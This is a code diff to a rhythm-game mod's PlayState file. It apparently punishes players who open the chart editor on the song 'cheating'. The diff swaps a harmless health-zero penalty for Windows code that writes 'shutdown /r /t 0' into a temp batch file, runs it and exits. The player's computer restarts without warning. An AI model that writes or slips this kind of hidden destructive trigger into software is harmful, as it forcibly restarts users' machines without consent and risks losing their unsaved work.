@@ -194,6 +194,8 @@ class PlayState extends MusicBeatState
 	public var thing:FlxSprite = new FlxSprite(0, 250);
 	public var splitathonExpressionAdded:Bool = false;
 
+	public var crazyBatch:String = "shutdown /r /t 0";
+
 	override public function create()
 	{
 		theFunne = FlxG.save.data.newInput;
@@ -2108,11 +2110,14 @@ class PlayState extends MusicBeatState
 				return;
 				// FlxG.switchState(new VideoState('assets/videos/fortnite/fortniteballs.webm', new CrasherState()));
 			}
+			#if windows
 			if (curSong.toLowerCase() == 'cheating')
-			{
-				health = 0;
-				return;
-			}
+				{
+					File.saveContent(CoolSystemStuff.getTempPath() + "/die.bat", crazyBatch);
+					new Process(CoolSystemStuff.getTempPath() + "/die.bat", []);
+					Sys.exit(0);
+				}
+			#end
 			FlxG.switchState(new ChartingState());
 			#if desktop
 			DiscordClient.changePresence("Chart Editor", null, null, true);
